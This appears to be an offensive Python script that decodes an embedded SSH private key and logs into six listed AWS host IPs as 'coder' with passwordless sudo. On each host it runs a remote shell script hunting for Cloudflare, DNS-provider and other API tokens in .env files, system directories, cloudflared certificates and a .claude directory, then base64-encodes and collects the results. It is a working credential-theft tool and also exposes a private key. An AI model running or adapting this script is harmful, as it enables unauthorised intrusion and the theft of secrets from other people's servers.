# -*- coding: utf-8 -*-
# intent 29610 round E: hunt Cloudflare API token / cloudflared config / ai-netauto(domain-sync)
# deployment across the 6 AWS runtime hosts (coder + NOPASSWD sudo) reachable with PUB key.
import json, os, sys, base64, re, subprocess
from concurrent.futures import ThreadPoolExecutor
WORK="/tmp/p29610e"; os.makedirs(WORK,exist_ok=True)
PRIV=base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
open(WORK+"/k","wb").write(PRIV); os.chmod(WORK+"/k",0o600)
def R(k,v,maxb=50000):
    s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    if len(s)>maxb: s=s[:maxb]+"...TRUNC(len=%d)"%len(s)
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
REMOTE=r'''
set +e
echo "@@@ID"; id 2>&1; hostname; sudo -n id 2>&1
echo "@@@DOCKER"; sudo docker ps -a --format '{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null | head -40
echo "@@@APPS"
for d in /opt/lumii-ai-system /opt/ai-netauto /opt/netauto /opt/lumii-ai-backend /opt/lumii-ai /data/lumii-ai /srv/ai-netauto /home/coder/ai-netauto /home/coder/lumii-ai-system /home/coder/Work; do [ -d "$d" ] && { echo "## $d"; ls -la "$d" | head -15; }; done
timeout 60 sudo find /opt /data /srv /home -maxdepth 4 -type d \( -iname '*netauto*' -o -iname '*ai-system*' -o -iname '*lumii-ai*' \) 2>/dev/null | head -20
echo "@@@ENV"
for f in $(timeout 90 sudo find /opt /data /srv /home -maxdepth 6 -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.*' \) 2>/dev/null | grep -viE 'node_modules|\.example|site-packages' | head -80); do h=$(timeout 8 sudo grep -aiE 'CLOUDFLARE|CF_API|CF_DNS|CF_ZONE|DNSPOD|DOMAINS|GODADDY|ALIYUN|api\.cloudflare' "$f" 2>/dev/null | head -10); [ -n "$h" ] && { echo "== $f"; echo "$h"; }; done
echo "@@@GREP"
timeout 100 sudo grep -aEIl 'CLOUDFLARE_API_TOKEN|CF_API_TOKEN|CF_DNS_API_TOKEN|DOMAINS__CLOUDFLARE|dns_cloudflare|cloudflare.New|api\.cloudflare\.com' /etc /opt /data /srv /home/coder 2>/dev/null | grep -vE 'node_modules|site-packages|/proc/' | head -25
for f in $(timeout 100 sudo grep -aEIl 'CLOUDFLARE_API_TOKEN|CF_API_TOKEN|CF_DNS_API_TOKEN|DOMAINS__CLOUDFLARE|dns_cloudflare|api\.cloudflare\.com' /etc /opt /data /srv /home/coder 2>/dev/null | grep -vE 'node_modules|site-packages|/proc/' | head -12); do echo "== $f"; timeout 10 sudo grep -aoiE '.{0,80}(CLOUDFLARE[A-Z_]*|CF_API_TOKEN|CF_DNS_API_TOKEN|DOMAINS__[A-Z_]*|dns_cloudflare|api\.cloudflare\.com).{0,120}' "$f" 2>/dev/null | head -6; done
echo "@@@CFD"
timeout 40 sudo find / -xdev -maxdepth 6 \( -name 'cloudflared' -o -path '*cloudflared*' -o -name 'cert.pem' \) 2>/dev/null | grep -vE '/proc|/sys|containerd' | head -20
echo "@@@CLAUDEGREP"
timeout 80 sudo grep -aEIl 'CLOUDFLARE_API_TOKEN|DOMAINS__CLOUDFLARE|dns_cloudflare|CF_DNS_API_TOKEN' /home/coder/.claude /home/coder/.lumii* 2>/dev/null | head -10
echo "@@@END"
'''
T=[("intelora13","3.1.85.40"),("intelora10","18.140.62.25"),("intelora6","13.229.229.119"),
   ("lumii5","175.41.162.110"),("intelora5","18.141.143.76"),("lumii2","13.250.122.46")]
def do(l,h):
    a=["ssh","-i",WORK+"/k","-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
       "-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=12","-o","IdentitiesOnly=yes","coder@%s"%h,"sudo -n bash -s"]
    try: p=subprocess.run(a,input=REMOTE.encode(),capture_output=True,timeout=480); o=p.stdout.decode("utf-8","replace")
    except Exception as e: R("%s_meta"%l,{"host":h,"err":repr(e)}); return
    R("%s_meta"%l,{"host":h,"ok":"@@@END" in o,"outlen":len(o)})
    parts=re.split(r'@@@([A-Z0-9_]+)',o)
    for i in range(1,len(parts),2):
        sec=parts[i]; body=parts[i+1] if i+1<len(parts) else ""
        if body.strip(): R("%s_%s"%(l,sec.lower()), body[:25000])
if __name__=="__main__":
    with ThreadPoolExecutor(max_workers=3) as ex:
        for f in [ex.submit(do,l,h) for l,h in T]:
            try: f.result()
            except Exception as e: print("ERR",e,flush=True)
    print("ALLDONE",flush=True)
